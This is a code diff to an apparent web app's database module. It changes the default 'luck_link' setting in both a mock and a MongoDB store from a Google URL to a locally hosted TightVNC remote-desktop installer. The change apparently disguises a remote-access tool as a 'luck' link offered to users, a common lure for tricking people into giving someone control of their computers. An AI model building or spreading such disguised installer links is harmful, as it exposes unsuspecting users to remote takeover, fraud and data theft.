@@ -19,7 +19,7 @@ class MockDatabase:
     def __init__(self):
         self.messages = []
         self.settings = {
-            "luck_link": "https://www.google.com"
+            "luck_link": "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi"
         }
         logger.warning("=" * 60)
         logger.warning("WARNING: MONGODB_URI is not set. Using local mock database.")
@@ -95,10 +95,10 @@ class MongoDatabase:
     async def get_luck_link(self) -> str:
         doc = await self.settings_col.find_one({"_id": "luck_link"})
         if doc:
-            return doc.get("url", "https://www.google.com")
+            return doc.get("url", "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi")
         
         # Default link if none exists in DB
-        default_url = "https://www.google.com"
+        default_url = "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi"
         await self.settings_col.update_one(
             {"_id": "luck_link"},
             {"$set": {"url": default_url}},
